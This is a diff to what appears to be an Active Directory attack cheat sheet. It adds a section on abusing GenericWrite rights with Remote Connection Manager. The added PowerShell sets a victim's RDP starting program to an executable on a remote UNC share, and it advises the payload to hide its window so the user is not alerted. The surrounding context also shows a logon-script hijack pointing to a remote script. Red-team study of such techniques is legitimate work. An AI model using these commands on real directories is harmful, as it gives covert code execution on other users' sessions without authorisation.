@@ -48,6 +48,7 @@
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
       - [GenericAll](#genericall)
       - [GenericWrite](#genericwrite)
+      	- [GenericWrite and Remote Connection Manager](#genericwrite-and-remote-connection-manager)
       - [WriteDACL](#writedacl)
     - [Trust relationship between domains](#trust-relationship-between-domains)
     - [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
@@ -1149,6 +1150,22 @@ Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
 
 * WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : `Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1`
 
+##### GenericWrite and Remote Connection Manager
+
+> Now let’s say you are in an Active Directory environment that still actively uses a Windows Server version that has RCM enabled, or that you are able to enable RCM on a compromised RDSH, what can we actually do ? Well each user object in Active Directory has a tab called ‘Environment’.
+>  
+> This tab includes settings that, among other things, can be used to change what program is started when a user connects over the Remote Desktop Protocol (RDP) to a TS/RDSH in place of the normal graphical environment. The settings in the ‘Starting program’ field basically function like a windows shortcut, allowing you to supply either a local or remote (UNC) path to an executable which is to be started upon connecting to the remote host. During the logon process these values will be queried by the RCM process and run whatever executable is defined. - https://sensepost.com/blog/2020/ace-to-rce/
+
+:warning: The RCM is only active on Terminal Servers/Remote Desktop Session Hosts. The RCM has also been disabled on recent version of Windows (>2016), it requires a registry change to re-enable.
+
+```powershell
+$UserObject = ([ADSI]("LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld"))
+$UserObject.TerminalServicesInitialProgram = "\\1.2.3.4\share\file.exe"
+$UserObject.TerminalServicesWorkDirectory = "C:\"
+$UserObject.SetInfo()
+```
+
+NOTE: To not alert the user the payload should hide its own process window and spawn the normal graphical environment.
 
 #### WriteDACL
 
@@ -1699,3 +1716,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c5
 * [GPO Abuse - Part 2 - RastaMouse - 13 January 2019](https://rastamouse.me/2019/01/gpo-abuse-part-2/)
 * [Abusing GPO Permissions - harmj0y - March 17, 2016](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
 * [How To Attack Kerberos 101 - m0chan - July 31, 2019](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
+* [ACE to RCE - @JustinPerdok - July 24, 2020](https://sensepost.com/blog/2020/ace-to-rce/)
